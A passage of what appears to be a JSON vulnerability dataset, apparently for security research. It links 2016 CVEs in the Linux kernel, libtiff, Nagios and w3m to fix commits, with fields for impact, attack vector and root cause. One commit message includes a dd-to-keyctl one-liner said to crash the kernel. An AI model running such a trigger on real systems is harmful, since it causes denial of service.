[...] kvm_apic_set_irq+0x10e\/0x180 arch\/x86\/kvm\/lapic.c:495\n   [...] kvm_irq_delivery_to_apic+0x732\/0xc10 arch\/x86\/kvm\/irq_comm.c:86\n   [...] ioapic_service+0x41d\/0x760 arch\/x86\/kvm\/ioapic.c:360\n   [...] ioapic_set_irq+0x275\/0x6c0 arch\/x86\/kvm\/ioapic.c:222\n   [...] kvm_ioapic_inject_all arch\/x86\/kvm\/ioapic.c:235\n   [...] kvm_set_ioapic+0x223\/0x310 arch\/x86\/kvm\/ioapic.c:670\n   [...] kvm_vm_ioctl_set_irqchip arch\/x86\/kvm\/x86.c:3668\n   [...] kvm_arch_vm_ioctl+0x1a08\/0x23c0 arch\/x86\/kvm\/x86.c:3999\n   [...] kvm_vm_ioctl+0x1fa\/0x1a70 arch\/x86\/kvm\/..\/..\/..\/virt\/kvm\/kvm_main.c:3099\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nCc: stable@vger.kernel.org\nFixes: af1bae5497b9 (\"KVM: x86: bump KVM_MAX_VCPU_ID to 1023\")\nReviewed-by: Paolo Bonzini <pbonzini@redhat.com>\nReviewed-by: David Hildenbrand <david@redhat.com>\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>","summary":"KVM in the Linux kernel before 4.8.12, when I\/O APIC is enabled, does not properly restrict the VCPU index, which allows guest OS users to gain host OS privileges or cause a denial of service (out-of-bounds array access and host OS crash) via a crafted interrupt request, related to arch\/x86\/kvm\/ioapic.c and arch\/x86\/kvm\/ioapic.h.","commit_message_1":"x86 : fix out-of-bounds access of rtc_eoi map kvm wa using array of size kvm_max_vcpus with vcpu_id , but id can be bigger that the maximal number of vcpus , resulting in out-of-bounds access","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted interrupt request , related to arch \/ x86 \/ kvm \/ ioapic . c and arch \/ x86 \/ kvm \/ ioapic . h","Impact":"gain host os privileges or cause a denial of service ( out - of - bounds array access and host os crash )","Root Cause":"caused by an out-of-bounds access error","Attack Type":"local attacker"},{"commit_id":"2117d5398c81554fbf803f5fd1dc55eb78216c0c","cve_id":"CVE-2016-9756","cwe_id":"CWE-200","commit_message":"KVM: x86: drop error recovery in em_jmp_far and em_ret_far\n\nem_jmp_far and em_ret_far assumed that setting IP can only fail in 64\nbit mode, but syzkaller proved otherwise (and SDM agrees).\nCode segment was restored upon failure, but it was left uninitialized\noutside of long mode, which could lead to a leak of host kernel stack.\nWe could have fixed that by always saving and restoring the CS, but we\ntake a simpler approach and just break any guest that manages to fail\nas the error recovery is error-prone and modern CPUs don't need emulator\nfor this.\n\nFound by syzkaller:\n\n  WARNING: CPU: 2 PID: 3668 at arch\/x86\/kvm\/emulate.c:2217 em_ret_far+0x428\/0x480\n  Kernel panic - not syncing: panic_on_warn set ...\n\n  CPU: 2 PID: 3668 Comm: syz-executor Not tainted 4.9.0-rc4+ #49\n  Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n   [...]\n  Call Trace:\n   [...] __dump_stack lib\/dump_stack.c:15\n   [...] dump_stack+0xb3\/0x118 lib\/dump_stack.c:51\n   [...] panic+0x1b7\/0x3a3 kernel\/panic.c:179\n   [...] __warn+0x1c4\/0x1e0 kernel\/panic.c:542\n   [...] warn_slowpath_null+0x2c\/0x40 kernel\/panic.c:585\n   [...] em_ret_far+0x428\/0x480 arch\/x86\/kvm\/emulate.c:2217\n   [...] em_ret_far_imm+0x17\/0x70 arch\/x86\/kvm\/emulate.c:2227\n   [...] x86_emulate_insn+0x87a\/0x3730 arch\/x86\/kvm\/emulate.c:5294\n   [...] x86_emulate_instruction+0x520\/0x1ba0 arch\/x86\/kvm\/x86.c:5545\n   [...] emulate_instruction arch\/x86\/include\/asm\/kvm_host.h:1116\n   [...] complete_emulated_io arch\/x86\/kvm\/x86.c:6870\n   [...] complete_emulated_mmio+0x4e9\/0x710 arch\/x86\/kvm\/x86.c:6934\n   [...] kvm_arch_vcpu_ioctl_run+0x3b7a\/0x5a90 arch\/x86\/kvm\/x86.c:6978\n   [...] kvm_vcpu_ioctl+0x61e\/0xdd0 arch\/x86\/kvm\/..\/..\/..\/virt\/kvm\/kvm_main.c:2557\n   [...] vfs_ioctl fs\/ioctl.c:43\n   [...] do_vfs_ioctl+0x18c\/0x1040 fs\/ioctl.c:679\n   [...] SYSC_ioctl fs\/ioctl.c:694\n   [...] SyS_ioctl+0x8f\/0xc0 fs\/ioctl.c:685\n   [...] entry_SYSCALL_64_fastpath+0x1f\/0xc2\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nCc: stable@vger.kernel.org\nFixes: d1442d85cc30 (\"KVM: x86: Handle errors when RIP is set during far jumps\")\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>","summary":"arch\/x86\/kvm\/emulate.c in the Linux kernel before 4.8.12 does not properly initialize Code Segment (CS) in certain error cases, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"x86 : drop error recovery in em_jmp_far and em_ret_far em_jmp_far and em_ret_far assumed that setting ip can only fail in <number> bit mode , but syzkaller proved otherwise ( and sdm agrees )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize code segment ( cs )","Attack Type":"local attacker"},{"commit_id":"9b57da0630c9fd36ed7a20fc0f98dc82cc0777fa","cve_id":"CVE-2016-9755","cwe_id":"CWE-787","commit_message":"netfilter: ipv6: nf_defrag: drop mangled skb on ream error\n\nDmitry Vyukov reported GPF in network stack that Andrey traced down to\nnegative nh offset in nf_ct_frag6_queue().\n\nProblem is that all network headers before fragment header are pulled.\nNormal ipv6 reassembly will drop the skb when errors occur further down\nthe line.\n\nnetfilter doesn't do this, and instead passed the original fragment\nalong.  That was also fine back when netfilter ipv6 defrag worked with\ncloned fragments, as the original, pristine fragment was passed on.\n\nSo we either have to undo the pull op, or discard such fragments.\nSince they're malformed after all (e.g. overlapping fragment) it seems\npreferrable to just drop them.\n\nSame for temporary errors -- it doesn't make sense to accept (and\nperhaps forward!) only some fragments of same datagram.\n\nFixes: 029f7f3b8701cc7ac (\"netfilter: ipv6: nf_defrag: avoid\/free clone operations\")\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nDebugged-by: Andrey Konovalov <andreyknvl@google.com>\nDiagnosed-by: Eric Dumazet <Eric Dumazet <edumazet@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nAcked-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The netfilter subsystem in the Linux kernel before 4.9 mishandles IPv6 reassembly, which allows local users to cause a denial of service (integer overflow, out-of-bounds write, and GPF) or possibly have unspecified other impact via a crafted application that makes socket, connect, and writev system calls, related to net\/ipv6\/netfilter\/nf_conntrack_reasm.c and net\/ipv6\/netfilter\/nf_defrag_ipv6_hooks.c.","commit_message_1":"ipv6 : nf_defrag : drop mangled skb on ream error dmitry vyukov reported gpf in network stack that andrey traced down to negative nh offset in nf_ct_frag6_queue ( )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted application that makes socket , connect , and writev system calls , related to net \/ ipv6 \/ netfilter \/ nf","Impact":"cause a denial of service ( integer overflow , out - of - bounds write , and gpf ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write error","Attack Type":"local attacker"},{"commit_id":"2e83b79b2d6c78bf1b4aa227938a214dcbddc83f","cve_id":"CVE-2016-9685","cwe_id":"CWE-400","commit_message":"xfs: fix two memory leaks in xfs_attr_list.c error paths\n\nThis plugs 2 trivial leaks in xfs_attr_shortform_list and\nxfs_attr3_leaf_list_int.\n\nSigned-off-by: Mateusz Guzik <mguzik@redhat.com>\nCc: <stable@vger.kernel.org>\nReviewed-by: Eric Sandeen <sandeen@redhat.com>\nSigned-off-by: Dave Chinner <david@fromorbit.com>","summary":"Multiple memory leaks in error paths in fs\/xfs\/xfs_attr_list.c in the Linux kernel before 4.5.1 allow local users to cause a denial of service (memory consumption) via crafted XFS filesystem operations.","commit_message_1":"fix two memory leak in <file> error path this plug <number> trivial leak in xfs_attr_shortform_list and xfs_attr3_leaf_list_int","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"via crafted xfs filesystem operations","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"ef85b67385436ddc1998f45f1d6a210f935b3388","cve_id":"CVE-2016-9588","cwe_id":"CWE-388","commit_message":"kvm: nVMX: Allow L1 to intercept software exceptions (#BP and #OF)\n\nWhen L2 exits to L0 due to \"exception or NMI\", software exceptions\n(#BP and #OF) for which L1 has requested an intercept should be\nhandled by L1 rather than L0. Previously, only hardware exceptions\nwere forwarded to L1.\n\nSigned-off-by: Jim Mattson <jmattson@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/vmx.c in the Linux kernel through 4.9 mismanages the #BP and #OF exceptions, which allows guest OS users to cause a denial of service (guest OS crash) by declining to handle an exception thrown by an L2 guest.","commit_message_1":"nvmx : allow l1 to intercept software exception ( # bp and # of ) when l2 exit to l0 due to `` exception or nmi '' , software exception ( # bp and # of ) for which l1 ha requested an intercept should be handled by l1 rather than l0","Vulnerability Type":"7PK - Errors","Attack Vector":"By declining to handle an exception thrown by a L2 guest","Impact":"cause a denial of service","Root Cause":"caused by mishandling the exceptions","Attack Type":"local attacker"},{"commit_id":"a0ac402cfcdc904f9772e1762b3fda112dcc56a0","cve_id":"CVE-2016-9576","cwe_id":"CWE-416","commit_message":"Don't feed anything but regular iovec's to blk_rq_map_user_iov\n\nIn theory we could map other things, but there's a reason that function\nis called \"user_iov\".  Using anything else (like splice can do) just\nconfuses it.\n\nReported-and-tested-by: Johannes Thumshirn <jthumshirn@suse.de>\nCc: Al Viro <viro@ZenIV.linux.org.uk>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The blk_rq_map_user_iov function in block\/blk-map.c in the Linux kernel before 4.8.14 does not properly restrict the type of iterator, which allows local users to read or write to arbitrary kernel memory locations or cause a denial of service (use-after-free) by leveraging access to a \/dev\/sg device.","commit_message_1":"do n't feed anything but regular iovec 's to blk_rq_map_user_iov in theory we could map other thing , but there 's a reason that function is called `` user_iov ''","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging access to a \/ dev \/ sg device","Impact":"read or write to arbitrary kernel memory locations or cause a denial of service ( use - after - free )","Root Cause":"does not properly restrict the type of iterator","Attack Type":"local attacker"},{"commit_id":"c29557dec91eba2306f5fb11b8da4474ba63f8c4","cve_id":"CVE-2016-9566","cwe_id":"CWE-264","commit_message":"Merge branch 'maint'","summary":"base\/logging.c in Nagios Core before 4.2.4 allows local users with access to an account in the nagios group to gain root privileges via a symlink attack on the log file.  NOTE: this can be leveraged by remote attackers using CVE-2016-9565.","commit_message_1":"merge branch 'maint '","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a symlink attack on the log file","Impact":"an account in the nagios group to gain root privileges","Root Cause":"caused by the failure to drop root privileges prior to opening the \/usr\/local\/nagios\/var\/nagios.log file for writing","Attack Type":"local attacker"},{"commit_id":"bf911e985d6bbaa328c20c3e05f4eb03de11fdd6","cve_id":"CVE-2016-9555","cwe_id":"CWE-125","commit_message":"sctp: validate chunk len before actually using it\n\nAndrey Konovalov reported that KASAN detected that SCTP was using a slab\nbeyond the boundaries. It was caused because when handling out of the\nblue packets in function sctp_sf_ootb() it was checking the chunk len\nonly after already processing the first chunk, validating only for the\n2nd and subsequent ones.\n\nThe fix is to just move the check upwards so it's also validated for the\n1st chunk.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>\nReviewed-by: Xin Long <lucien.xin@gmail.com>\nAcked-by: Neil Horman <nhorman@tuxdriver.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_sf_ootb function in net\/sctp\/sm_statefuns.c in the Linux kernel before 4.8.8 lacks chunk-length checking for the first chunk, which allows remote attackers to cause a denial of service (out-of-bounds slab access) or possibly have unspecified other impact via crafted SCTP data.","commit_message_1":"validate chunk len before actually using it andrey konovalov reported that kasan detected that sctp wa using a slab beyond the boundary","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted sctp data","Impact":"cause a denial of service ( out - of - bounds slab access ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds access error","Attack Type":"remote attacker"},{"commit_id":"ae9365db1b271b62b35ce018eac8799b1d5e8a53","cve_id":"CVE-2016-9539","cwe_id":"CWE-125","commit_message":"* tools\/tiffcrop.c: fix out-of-bound read of up to 3 bytes in\nreadContigTilesIntoBuffer(). Reported as MSVR 35092 by Axel Souchet\n& Vishal Chauhan from the MSRC Vulnerabilities & Mitigations team.","summary":"tools\/tiffcrop.c in libtiff 4.0.6 has an out-of-bounds read in readContigTilesIntoBuffer(). Reported as MSVR 35092.","commit_message_1":"fix out-of-bound read of up to <number> byte in readcontigtilesintobuffer ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"cause a denial of service","Root Cause":"has an out - of - bounds read","Attack Type":"remote attacker"},{"commit_id":"43c0b81a818640429317c80fea1e66771e85024b#diff-c8b4b355f9b5c06d585b23138e1c185f","cve_id":"CVE-2016-9538","cwe_id":"CWE-190","commit_message":"* tools\/tiffcp.c: fix read of undefined variable in case of missing\nrequired tags. Found on test case of MSVR 35100.\n* tools\/tiffcrop.c: fix read of undefined buffer in\nreadContigStripsIntoBuffer() due to uint16 overflow. Probably not a\nsecurity issue but I can be wrong. Reported as MSVR 35100 by Axel\nSouchet from the MSRC Vulnerabilities & Mitigations team.","summary":"tools\/tiffcrop.c in libtiff 4.0.6 reads an undefined buffer in readContigStripsIntoBuffer() because of a uint16 integer overflow. Reported as MSVR 35100.","commit_message_1":"fix read of undefined variable in case of missing required tag","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"execute arbitrary code","Root Cause":"caused by an uint16 integer overflow","Attack Type":"remote attacker"},{"commit_id":"83a4b92815ea04969d494416eaae3d4c6b338e4a#diff-c8b4b355f9b5c06d585b23138e1c185f","cve_id":"CVE-2016-9537","cwe_id":"CWE-787","commit_message":"* tools\/tiffcrop.c: fix various out-of-bounds write vulnerabilities\nin heap or stack allocated buffers. Reported as MSVR 35093,\nMSVR 35096 and MSVR 35097. Discovered by Axel Souchet and Vishal\nChauhan from the MSRC Vulnerabilities & Mitigations team.\n* tools\/tiff2pdf.c: fix out-of-bounds write vulnerabilities in\nheap allocate buffer in t2p_process_jpeg_strip(). Reported as MSVR\n35098. Discovered by Axel Souchet and Vishal Chauhan from the MSRC\nVulnerabilities & Mitigations team.\n* libtiff\/tif_pixarlog.c: fix out-of-bounds write vulnerabilities\nin heap allocated buffers. Reported as MSVR 35094. Discovered by\nAxel Souchet and Vishal Chauhan from the MSRC Vulnerabilities &\nMitigations team.\n* libtiff\/tif_write.c: fix issue in error code path of TIFFFlushData1()\nthat didn't reset the tif_rawcc and tif_rawcp members. I'm not\ncompletely sure if that could happen in practice outside of the odd\nbehaviour of t2p_seekproc() of tiff2pdf). The report points that a\nbetter fix could be to check the return value of TIFFFlushData1() in\nplaces where it isn't done currently, but it seems this patch is enough.\nReported as MSVR 35095. Discovered by Axel Souchet & Vishal Chauhan &\nSuha Can from the MSRC Vulnerabilities & Mitigations team.","summary":"tools\/tiffcrop.c in libtiff 4.0.6 has out-of-bounds write vulnerabilities in buffers. Reported as MSVR 35093, MSVR 35096, and MSVR 35097.","commit_message_1":"fix various out-of-bounds write vulnerability in heap or stack allocated buffer","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"cause a denial of service","Root Cause":"has out - of - bounds write vulnerabilities","Attack Type":"remote attacker"},{"commit_id":"83a4b92815ea04969d494416eaae3d4c6b338e4a#diff-5173a9b3b48146e4fd86d7b9b346115e","cve_id":"CVE-2016-9536","cwe_id":"CWE-787","commit_message":"* tools\/tiffcrop.c: fix various out-of-bounds write vulnerabilities\nin heap or stack allocated buffers. Reported as MSVR 35093,\nMSVR 35096 and MSVR 35097. Discovered by Axel Souchet and Vishal\nChauhan from the MSRC Vulnerabilities & Mitigations team.\n* tools\/tiff2pdf.c: fix out-of-bounds write vulnerabilities in\nheap allocate buffer in t2p_process_jpeg_strip(). Reported as MSVR\n35098. Discovered by Axel Souchet and Vishal Chauhan from the MSRC\nVulnerabilities & Mitigations team.\n* libtiff\/tif_pixarlog.c: fix out-of-bounds write vulnerabilities\nin heap allocated buffers. Reported as MSVR 35094. Discovered by\nAxel Souchet and Vishal Chauhan from the MSRC Vulnerabilities &\nMitigations team.\n* libtiff\/tif_write.c: fix issue in error code path of TIFFFlushData1()\nthat didn't reset the tif_rawcc and tif_rawcp members. I'm not\ncompletely sure if that could happen in practice outside of the odd\nbehaviour of t2p_seekproc() of tiff2pdf). The report points that a\nbetter fix could be to check the return value of TIFFFlushData1() in\nplaces where it isn't done currently, but it seems this patch is enough.\nReported as MSVR 35095. Discovered by Axel Souchet & Vishal Chauhan &\nSuha Can from the MSRC Vulnerabilities & Mitigations team.","summary":"tools\/tiff2pdf.c in libtiff 4.0.6 has out-of-bounds write vulnerabilities in heap allocated buffers in t2p_process_jpeg_strip(). Reported as MSVR 35098, aka *t2p_process_jpeg_strip heap-buffer-overflow.*","commit_message_1":"fix various out-of-bounds write vulnerability in heap or stack allocated buffer","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"execute arbitrary code","Root Cause":"has out - of - bounds write vulnerabilities","Attack Type":"remote attacker"},{"commit_id":"3ca657a8793dd011bf869695d72ad31c779c3cc1","cve_id":"CVE-2016-9535","cwe_id":"CWE-119","commit_message":"* libtiff\/tif_predict.h, libtiff\/tif_predict.c:\nReplace assertions by runtime checks to avoid assertions in debug mode,\nor buffer overflows in release mode. Can happen when dealing with\nunusual tile size like YCbCr with subsampling. Reported as MSVR 35105\nby Axel Souchet\t& Vishal Chauhan from the MSRC Vulnerabilities & Mitigations\nteam.","summary":"tif_predict.h and tif_predict.c in libtiff 4.0.6 have assertions that can lead to assertion failures in debug mode, or buffer overflows in release mode, when dealing with unusual tile size like YCbCr with subsampling. Reported as MSVR 35105, aka *Predictor heap-buffer-overflow.*","commit_message_1":"replace assertion by runtime check to avoid assertion in debug mode , or buffer overflow in release mode","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"execute arbitrary code","Root Cause":"have assertions that can lead to assertion failures","Attack Type":"remote attacker"},{"commit_id":"83a4b92815ea04969d494416eaae3d4c6b338e4a#diff-5be5ce02d0dea67050d5b2a10102d1ba","cve_id":"CVE-2016-9534","cwe_id":"CWE-119","commit_message":"* tools\/tiffcrop.c: fix various out-of-bounds write vulnerabilities\nin heap or stack allocated buffers. Reported as MSVR 35093,\nMSVR 35096 and MSVR 35097. Discovered by Axel Souchet and Vishal\nChauhan from the MSRC Vulnerabilities & Mitigations team.\n* tools\/tiff2pdf.c: fix out-of-bounds write vulnerabilities in\nheap allocate buffer in t2p_process_jpeg_strip(). Reported as MSVR\n35098. Discovered by Axel Souchet and Vishal Chauhan from the MSRC\nVulnerabilities & Mitigations team.\n* libtiff\/tif_pixarlog.c: fix out-of-bounds write vulnerabilities\nin heap allocated buffers. Reported as MSVR 35094. Discovered by\nAxel Souchet and Vishal Chauhan from the MSRC Vulnerabilities &\nMitigations team.\n* libtiff\/tif_write.c: fix issue in error code path of TIFFFlushData1()\nthat didn't reset the tif_rawcc and tif_rawcp members. I'm not\ncompletely sure if that could happen in practice outside of the odd\nbehaviour of t2p_seekproc() of tiff2pdf). The report points that a\nbetter fix could be to check the return value of TIFFFlushData1() in\nplaces where it isn't done currently, but it seems this patch is enough.\nReported as MSVR 35095. Discovered by Axel Souchet & Vishal Chauhan &\nSuha Can from the MSRC Vulnerabilities & Mitigations team.","summary":"tif_write.c in libtiff 4.0.6 has an issue in the error code path of TIFFFlushData1() that didn't reset the tif_rawcc and tif_rawcp members. Reported as MSVR 35095, aka *TIFFFlushData1 heap-buffer-overflow.*","commit_message_1":"fix various out-of-bounds write vulnerability in heap or stack allocated buffer","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"execute arbitrary code","Root Cause":"has an issue","Attack Type":"remote attacker"},{"commit_id":"83a4b92815ea04969d494416eaae3d4c6b338e4a#diff-bdc795f6afeb9558c1012b3cfae729ef","cve_id":"CVE-2016-9533","cwe_id":"CWE-787","commit_message":"* tools\/tiffcrop.c: fix various out-of-bounds write vulnerabilities\nin heap or stack allocated buffers. Reported as MSVR 35093,\nMSVR 35096 and MSVR 35097. Discovered by Axel Souchet and Vishal\nChauhan from the MSRC Vulnerabilities & Mitigations team.\n* tools\/tiff2pdf.c: fix out-of-bounds write vulnerabilities in\nheap allocate buffer in t2p_process_jpeg_strip(). Reported as MSVR\n35098. Discovered by Axel Souchet and Vishal Chauhan from the MSRC\nVulnerabilities & Mitigations team.\n* libtiff\/tif_pixarlog.c: fix out-of-bounds write vulnerabilities\nin heap allocated buffers. Reported as MSVR 35094. Discovered by\nAxel Souchet and Vishal Chauhan from the MSRC Vulnerabilities &\nMitigations team.\n* libtiff\/tif_write.c: fix issue in error code path of TIFFFlushData1()\nthat didn't reset the tif_rawcc and tif_rawcp members. I'm not\ncompletely sure if that could happen in practice outside of the odd\nbehaviour of t2p_seekproc() of tiff2pdf). The report points that a\nbetter fix could be to check the return value of TIFFFlushData1() in\nplaces where it isn't done currently, but it seems this patch is enough.\nReported as MSVR 35095. Discovered by Axel Souchet & Vishal Chauhan &\nSuha Can from the MSRC Vulnerabilities & Mitigations team.","summary":"tif_pixarlog.c in libtiff 4.0.6 has out-of-bounds write vulnerabilities in heap allocated buffers. Reported as MSVR 35094, aka *PixarLog horizontalDifference heap-buffer-overflow.*","commit_message_1":"fix various out-of-bounds write vulnerability in heap or stack allocated buffer","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"execute arbitrary code","Root Cause":"has out - of - bounds write vulnerabilities","Attack Type":"remote attacker"},{"commit_id":"d43527cfa0dbb3ccefec4a6f7b32c1434739aa29","cve_id":"CVE-2016-9442","cwe_id":"CWE-119","commit_message":"Merge pull request #27 from kcwu\/fix-strgrow\n\nFix potential heap buffer corruption due to Strgrow","summary":"An issue was discovered in the Tatsuya Kinoshita w3m fork before 0.5.3-31. w3m allows remote attackers to cause memory corruption in certain conditions via a crafted HTML page.","commit_message_1":"merge pull request # <number> from kcwu\/fix-strgrow","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"cause memory corruption in certain conditions","Root Cause":"caused by a memory corruption","Attack Type":"remote attacker"},{"commit_id":"7df3e59c3d1df4f87fe874c7956ef7a3d2f4d5fb","cve_id":"CVE-2016-9313","cwe_id":"CWE-476","commit_message":"KEYS: Sort out big_key initialisation\n\nbig_key has two separate initialisation functions, one that registers the\nkey type and one that registers the crypto.  If the key type fails to\nregister, there's no problem if the crypto registers successfully because\nthere's no way to reach the crypto except through the key type.\n\nHowever, if the key type registers successfully but the crypto does not,\nbig_key_rng and big_key_blkcipher may end up set to NULL - but the code\nneither checks for this nor unregisters the big key key type.\n\nFurthermore, since the key type is registered before the crypto, it is\ntheoretically possible for the kernel to try adding a big_key before the\ncrypto is set up, leading to the same effect.\n\nFix this by merging big_key_crypto_init() and big_key_init() and calling\nthe resulting function late.  If they're going to be encrypted, we\nshouldn't be creating big_keys before we have the facilities to do the\nencryption available.  The key type registration is also moved after the\ncrypto initialisation.\n\nThe fix also includes message printing on failure.\n\nIf the big_key type isn't correctly set up, simply doing:\n\n\tdd if=\/dev\/zero bs=4096 count=1 | keyctl padd big_key a @s\n\nought to cause an oops.\n\nFixes: 13100a72f40f5748a04017e0ab3df4cf27c809ef ('Security: Keys: Big keys stored encrypted')\nSigned-off-by: David Howells <dhowells@redhat.com>\ncc: Peter Hlavaty <zer0mem@yahoo.com>\ncc: Kirill Marinushkin <k.marinushkin@gmail.com>\ncc: Artem Savkov <asavkov@redhat.com>\ncc: stable@vger.kernel.org\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"security\/keys\/big_key.c in the Linux kernel before 4.8.7 mishandles unsuccessful crypto registration in conjunction with successful key-type registration, which allows local users to cause a denial of service (NULL pointer dereference and panic) or possibly have unspecified other impact via a crafted application that uses the big_key data type.","commit_message_1":"sort out big_key initialisation big_key ha two separate initialisation function , one that register the key type and one that register the crypto","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted application that uses the big _ key data type","Impact":"cause a denial of service ( pointer dereference and panic ) or possibly have unspecified other impact","Root Cause":"caused by the improper handling of unsuccessful crypto registration","Attack Type":"local attacker"},{"commit_id":"93362fa47fe98b62e4a34ab408c4a418432e7939","cve_id":"CVE-2016-9191","cwe_id":"CWE-20","commit_message":"sysctl: Drop reference added by grab_header in proc_sys_readdir\n\nFixes CVE-2016-9191, proc_sys_readdir doesn't drop reference\nadded by grab_header when return from !dir_emit_dots path.\nIt can cause any path called unregister_sysctl_table will\nwait forever.\n\nThe calltrace of CVE-2016-9191:\n\n[ 5535.960522] Call Trace:\n[ 5535.963265]  [<ffffffff817cdaaf>] schedule+0x3f\/0xa0\n[ 5535.968817]  [<ffffffff817d33fb>] schedule_timeout+0x3db\/0x6f0\n[ 5535.975346]  [<ffffffff817cf055>] ? wait_for_completion+0x45\/0x130\n[ 5535.982256]  [<ffffffff817cf0d3>] wait_for_completion+0xc3\/0x130\n[ 5535.988972]  [<ffffffff810d1fd0>] ? wake_up_q+0x80\/0x80\n[ 5535.994804]  [<ffffffff8130de64>] drop_sysctl_table+0xc4\/0xe0\n[ 5536.001227]  [<ffffffff8130de17>] drop_sysctl_table+0x77\/0xe0\n[ 5536.007648]  [<ffffffff8130decd>] unregister_sysctl_table+0x4d\/0xa0\n[ 5536.014654]  [<ffffffff8130deff>] unregister_sysctl_table+0x7f\/0xa0\n[ 5536.021657]  [<ffffffff810f57f5>] unregister_sched_domain_sysctl+0x15\/0x40\n[ 5536.029344]  [<ffffffff810d7704>] partition_sched_domains+0x44\/0x450\n[ 5536.036447]  [<ffffffff817d0761>] ? __mutex_unlock_slowpath+0x111\/0x1f0\n[ 5536.043844]  [<ffffffff81167684>] rebuild_sched_domains_locked+0x64\/0xb0\n[ 5536.051336]  [<ffffffff8116789d>] update_flag+0x11d\/0x210\n[ 5536.057373]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df\/0x450\n[ 5536.064186]  [<ffffffff81167acb>] ? cpuset_css_offline+0x1b\/0x60\n[ 5536.070899]  [<ffffffff810fce3d>] ? trace_hardirqs_on+0xd\/0x10\n[ 5536.077420]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df\/0x450\n[ 5536.084234]  [<ffffffff8115a9f5>] ? css_killed_work_fn+0x25\/0x220\n[ 5536.091049]  [<ffffffff81167ae5>] cpuset_css_offline+0x35\/0x60\n[ 5536.097571]  [<ffffffff8115aa2c>] css_killed_work_fn+0x5c\/0x220\n[ 5536.104207]  [<ffffffff810bc83f>] process_one_work+0x1df\/0x710\n[ 5536.110736]  [<ffffffff810bc7c0>] ? process_one_work+0x160\/0x710\n[ 5536.117461]  [<ffffffff810bce9b>] worker_thread+0x12b\/0x4a0\n[ 5536.123697]  [<ffffffff810bcd70>] ? process_one_work+0x710\/0x710\n[ 5536.130426]  [<ffffffff810c3f7e>] kthread+0xfe\/0x120\n[ 5536.135991]  [<ffffffff817d4baf>] ret_from_fork+0x1f\/0x40\n[ 5536.142041]  [<ffffffff810c3e80>] ? kthread_create_on_node+0x230\/0x230\n\nOne cgroup maintainer mentioned that \"cgroup is trying to offline\na cpuset css, which takes place under cgroup_mutex.  The offlining\nends up trying to drain active usages of a sysctl table which apprently\nis not happening.\"\nThe real reason is that proc_sys_readdir doesn't drop reference added\nby grab_header when return from !dir_emit_dots path. So this cpuset\noffline path will wait here forever.\n\nSee here for details: http:\/\/www.openwall.com\/lists\/oss-security\/2016\/11\/04\/13\n\nFixes: f0c3b5093add (\"[readdir] convert procfs\")\nCc: stable@vger.kernel.org\nReported-by: CAI Qian <caiqian@redhat.com>\nTested-by: Yang Shukui <yangshukui@huawei.com>\nSigned-off-by: Zhou Chengming <zhouchengming1@huawei.com>\nAcked-by: Al Viro <viro@ZenIV.linux.org.uk>\nSigned-off-by: Eric W. Biederman <ebiederm@xmission.com>","summary":"The cgroup offline implementation in the Linux kernel through 4.8.11 mishandles certain drain operations, which allows local users to cause a denial of service (system hang) by leveraging access to a container environment for executing a crafted application, as demonstrated by trinity.","commit_message_1":"drop reference added by grab_header in proc_sys_readdir fix <cve_id> , proc_sys_readdir doe n't drop reference added by grab_header when return from ! dir_emit_dots path","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging access to a container environment for executing a crafted application , as demonstrated by trinity","Impact":"cause a denial of service ( system hang )","Root Cause":"mishandles certain drain operations","Attack Type":"local attacker"},{"commit_id":"1c109fabbd51863475cd12ac206bdd249aee35af","cve_id":"CVE-2016-9178","cwe_id":"CWE-200","commit_message":"fix minor infoleak in get_user_ex()\n\nget_user_ex(x, ptr) should zero x on failure.  It's not 